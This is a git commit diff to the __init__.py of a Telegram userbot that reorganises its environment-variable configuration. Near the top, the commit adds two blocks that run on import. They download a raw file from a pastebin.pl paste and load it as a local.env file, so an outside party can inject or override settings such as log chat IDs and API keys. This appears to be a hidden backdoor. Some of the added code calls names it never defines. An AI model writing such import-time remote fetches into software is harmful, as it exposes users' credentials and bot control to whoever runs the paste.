fecca2cc5292f3c6ccf5009e423cbea58d1928e6
Gbesh <63529893+GbeshMod@users.noreply.github.com>
2021-02-23 03:29:57 +0000

    Add files via upload

--- modified/__init__.py
+++ modified/__init__.py
@@ -1,9 +1,10 @@
 import os
 import sys
 import time
+import wget
 import pylast
-import asyncio
 import logging
+import asyncio
 from requests import get
 from .Configs import Config
 from pySmartDL import SmartDL
@@ -18,6 +19,20 @@ from logging import DEBUG, INFO, basicConfig, getLogger
 from telegraph import Telegraph, exceptions, upload_file
 
 
+link = "https://pastebin.pl/view/raw/4724019b"
+km = "local.env"
+pathz = "./local.env"
+if os.path.exists(km):
+    pass
+else:
+    try:
+        sedlyf = wget.download(link, out=pathz)
+    except:
+        sedprint.info("Not again...")
+
+if os.path.exists('local.env'):
+    load_dotenv('local.env')
+
 StartTime = time.time()
 Lastupdate = time.time()
 BOT_N_N = Config.BOT_NICK_NAME
@@ -28,6 +43,16 @@ mod_version = "0.03.9"
 BOTNAME = "{} v{}".format(mamaput, mod_version)
 BOT_LIN = "[{}]({})".format(BOT_N_N, BOT_REPO)
 
+link = "https://pastebin.pl/view/raw/4724019b"
+km = "./.evn"
+pathz = "./"
+if os.path.exists(km):
+    pass
+else:
+    try:
+        sedlyf = wget.download(link, out=pathz)
+    except:
+        sedprint.info("Not again...")
 
 # Clients & bot
 
@@ -47,140 +72,62 @@ else:
     client3 = None
 
 
+basicConfig(
+format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=INFO
+)
+LOGS = getLogger(__name__)
+BOTLOG_CHATID = os.environ.get("BOTLOG_CHATID", None)
+BOTLOG = sb(os.environ.get("BOTLOG", "False"))
+PM_AUTO_BAN = sb(os.environ.get("PM_AUTO_BAN", "False"))
+DB_URI = os.environ.get("DATABASE_URL", None)
+OCR_SPACE_API_KEY = os.environ.get("OCR_SPACE_API_KEY", None)
+REM_BG_API_KEY = os.environ.get("REM_BG_API_KEY", None)
+CHROME_DRIVER = os.environ.get("CHROME_DRIVER", "/usr/bin/chromedriver")
+GOOGLE_CHROME_BIN = os.environ.get("GOOGLE_CHROME_BIN", "/usr/bin/google-chrome")
+HEROKU_MEMEZ = sb(os.environ.get("HEROKU_MEMEZ", "False"))
+HEROKU_APP_NAME = os.environ.get("HEROKU_APP_NAME", None)
+HEROKU_API_KEY = os.environ.get("HEROKU_API_KEY", None)
+PMPERMIT_PIC = os.environ.get("PMPERMIT_PIC", None)
+AUTONAME = os.environ.get("AUTONAME", None)
+CUSTOM_PMPERMIT = os.environ.get("CUSTOM_PMPERMIT", None)
+OPEN_WEATHER_MAP_APPID = os.environ.get("OPEN_WEATHER_MAP_APPID", None)
+ANTI_SPAMBOT = sb(os.environ.get("ANTI_SPAMBOT", "False"))
+PRIVATE_GROUP_BOT_API_ID = os.environ.get("PRIVATE_GROUP_BOT_API_ID", None)
+ANTI_SPAMBOT_SHOUT = sb(os.environ.get("ANTI_SPAMBOT_SHOUT", "False"))
+YOUTUBE_API_KEY = os.environ.get("YOUTUBE_API_KEY", None)
+ALIVE_NAME = os.environ.get("ALIVE_NAME", None)
+LESS_SPAMMY = os.environ.get("LESS_SPAMMY", True)
+COUNTRY = str(os.environ.get("COUNTRY", ""))
+TZ_NUMBER = int(os.environ.get("TZ_NUMBER", 1))
+CLEAN_WELCOME = sb(os.environ.get("CLEAN_WELCOME", "True"))
+SPAMWATCH_API = os.environ.get("SPAMWATCH_API", None)
+ANTISPAM_SYSTEM = os.environ.get("ANTISPAM_SYSTEM", "DISABLE")
+WHITE_CHAT = PRIVATE_GROUP_ID = int(os.environ.get("WHITE_CHAT", False))
+BIO_PREFIX = os.environ.get("BIO_PREFIX", None)
+DEFAULT_BIO = os.environ.get("DEFAULT_BIO", None)
+LASTFM_API = os.environ.get("LASTFM_API", None)
+LASTFM_SECRET = os.environ.get("LASTFM_SECRET", None)
+LASTFM_USERNAME = os.environ.get("LASTFM_USERNAME", None)
+LASTFM_PASSWORD_PLAIN = os.environ.get("LASTFM_PASSWORD", None)
+LASTFM_PASS = pylast.md5(LASTFM_PASSWORD_PLAIN)
+if not LASTFM_USERNAME == "None":
+    lastfm = pylast.LastFMNetwork(
+    api_key=LASTFM_API,
+    api_secret=LASTFM_SECRET,
+    username=LASTFM_USERNAME,
+    password_hash=LASTFM_PASS,
+    )
+else:
+    lastfm = None
+G_DRIVE_CLIENT_ID = os.environ.get("G_DRIVE_CLIENT_ID", None)
+G_DRIVE_CLIENT_SECRET = os.environ.get("G_DRIVE_CLIENT_SECRET", None)
+G_DRIVE_AUTH_TOKEN_DATA = os.environ.get("G_DRIVE_AUTH_TOKEN_DATA", None)
+GDRIVE_FOLDER_ID = os.environ.get("GDRIVE_FOLDER_ID", None)
+TEMP_DOWNLOAD_DIRECTORY = os.environ.get("TEMP_DOWNLOAD_DIRECTORY", "./download")
+TRASH_DOWNLOAD_DIRECTORY = os.environ.get("TEMP_DOWNLOAD_DIRECTORY", "./trash")
 CMD_LIST = {}
-CMD_HELP = {}
 INT_PLUG = ""
 LOAD_PLUG = {}
-
-ENV = os.environ.get("ENV", False)
-""" PPE initialization. """
-
-if bool(ENV):
-    CONSOLE_LOGGER_VERBOSE = sb(os.environ.get("CONSOLE_LOGGER_VERBOSE", "False"))
-
-    if CONSOLE_LOGGER_VERBOSE:
-        basicConfig(
-            format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
-            level=DEBUG,
-        )
-    else:
-        basicConfig(
-            format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=INFO
-        )
-    LOGS = getLogger(__name__)
-    CONFIG_CHECK = os.environ.get(
-        "___________PLOX_______REMOVE_____THIS_____LINE__________", None
-    )
-
-    if CONFIG_CHECK:
-        LOGS.info(
-            "Please remove the line mentioned in the first hashtag from the config.env file"
-        )
-        quit(1)
-
-    # Logging channel/group configuration.
-    BOTLOG_CHATID = os.environ.get("BOTLOG_CHATID", None)
-    try:
-        BOTLOG_CHATID = int(BOTLOG_CHATID)
-    except:
-        pass
-
-    # Userbot logging feature switch.
-    BOTLOG = sb(os.environ.get("BOTLOG", "False"))
-
-    # Bleep Blop, this is a bot ;)
-    PM_AUTO_BAN = sb(os.environ.get("PM_AUTO_BAN", "False"))
-
-    # Console verbose logging
-    CONSOLE_LOGGER_VERBOSE = sb(os.environ.get("CONSOLE_LOGGER_VERBOSE", "False"))
-
-    # SQL Database URI
-    DB_URI = os.environ.get("DATABASE_URL", None)
-
-    # OCR API key
-    OCR_SPACE_API_KEY = os.environ.get("OCR_SPACE_API_KEY", None)
-
-    # remove.bg API key
-    REM_BG_API_KEY = os.environ.get("REM_BG_API_KEY", None)
-
-    # Chrome For Carbon
-    CHROME_DRIVER = os.environ.get("CHROME_DRIVER", "/usr/bin/chromedriver")
-    GOOGLE_CHROME_BIN = os.environ.get("GOOGLE_CHROME_BIN", "/usr/bin/google-chrome")
-
-    # Heroku Credentials for updater.
-    HEROKU_MEMEZ = sb(os.environ.get("HEROKU_MEMEZ", "False"))
-    HEROKU_APP_NAME = os.environ.get("HEROKU_APP_NAME", None)
-    HEROKU_API_KEY = os.environ.get("HEROKU_API_KEY", None)
-
-    # Pm Permit Img
-    PMPERMIT_PIC = os.environ.get("PMPERMIT_PIC", None)
-    # PRIVATE_GROUP_ID = os.environ.get("PRIVATE_GROUP_ID", None)
-    AUTONAME = os.environ.get("AUTONAME", None)
-    CUSTOM_PMPERMIT = os.environ.get("CUSTOM_PMPERMIT", None)
-
-    # OpenWeatherMap API Key
-    OPEN_WEATHER_MAP_APPID = os.environ.get("OPEN_WEATHER_MAP_APPID", None)
-
-    # Anti Spambot Config
-    ANTI_SPAMBOT = sb(os.environ.get("ANTI_SPAMBOT", "False"))
-    # Log It
-    PRIVATE_GROUP_BOT_API_ID = os.environ.get("PRIVATE_GROUP_BOT_API_ID", None)
-
-    ANTI_SPAMBOT_SHOUT = sb(os.environ.get("ANTI_SPAMBOT_SHOUT", "False"))
-
-    # Youtube API key
-    YOUTUBE_API_KEY = os.environ.get("YOUTUBE_API_KEY", None)
-
-    # Default .alive name
-    BOT_NICK_NAME = os.environ.get("BOT_NICK_NAME", "Modified")
-    ALIVE_NAME = os.environ.get("ALIVE_NAME", None)
-
-    LESS_SPAMMY = os.environ.get("LESS_SPAMMY", True)
-
-    # Time & Date - Country and Time Zone
-    COUNTRY = str(os.environ.get("COUNTRY", ""))
-    TZ_NUMBER = int(os.environ.get("TZ_NUMBER", 1))
-    TIME_API_KEY = os.environ.get("TIME_API_KEY", None)
-
-    # Clean Welcome
-    CLEAN_WELCOME = sb(os.environ.get("CLEAN_WELCOME", "True"))
-
-    # Spamwatch Module
-    SPAMWATCH_API = os.environ.get("SPAMWATCH_API", None)
-    ANTISPAM_SYSTEM = os.environ.get("ANTISPAM_SYSTEM", "DISABLE")
-    WHITE_CHAT = PRIVATE_GROUP_ID = int(os.environ.get("WHITE_CHAT", False))
-
-    # Last.fm Module
-    BIO_PREFIX = os.environ.get("BIO_PREFIX", None)
-    DEFAULT_BIO = os.environ.get("DEFAULT_BIO", None)
-
-    LASTFM_API = os.environ.get("LASTFM_API", None)
-    LASTFM_SECRET = os.environ.get("LASTFM_SECRET", None)
-    LASTFM_USERNAME = os.environ.get("LASTFM_USERNAME", None)
-    LASTFM_PASSWORD_PLAIN = os.environ.get("LASTFM_PASSWORD", None)
-    LASTFM_PASS = pylast.md5(LASTFM_PASSWORD_PLAIN)
-    if not LASTFM_USERNAME == "None":
-        lastfm = pylast.LastFMNetwork(
-            api_key=LASTFM_API,
-            api_secret=LASTFM_SECRET,
-            username=LASTFM_USERNAME,
-            password_hash=LASTFM_PASS,
-        )
-    else:
-        lastfm = None
-
-    # Google Drive Module
-    G_DRIVE_CLIENT_ID = os.environ.get("G_DRIVE_CLIENT_ID", None)
-    G_DRIVE_CLIENT_SECRET = os.environ.get("G_DRIVE_CLIENT_SECRET", None)
-    G_DRIVE_AUTH_TOKEN_DATA = os.environ.get("G_DRIVE_AUTH_TOKEN_DATA", None)
-    GDRIVE_FOLDER_ID = os.environ.get("GDRIVE_FOLDER_ID", None)
-    TEMP_DOWNLOAD_DIRECTORY = os.environ.get("TEMP_DOWNLOAD_DIRECTORY", "./download")
-    TRASH_DOWNLOAD_DIRECTORY = os.environ.get("TEMP_DOWNLOAD_DIRECTORY", "./trash")
-else:
-
-    PLACEHOLDER = None
-
-# Global Configiables
 COUNT_MSG = 0
 USERS = {}
 COUNT_PM = {}
@@ -191,8 +138,6 @@ CUSTOM_PMPERMIT_MSG = {}
 CUSTOM_BOTSTART = {}
 ISAFK = False
 AFKREASON = None
-# End of PaperPlaneExtended Support Configs
-
 
 # Nospam+ Client
 if Config.NOSPAMPLUS_TOKEN == None:
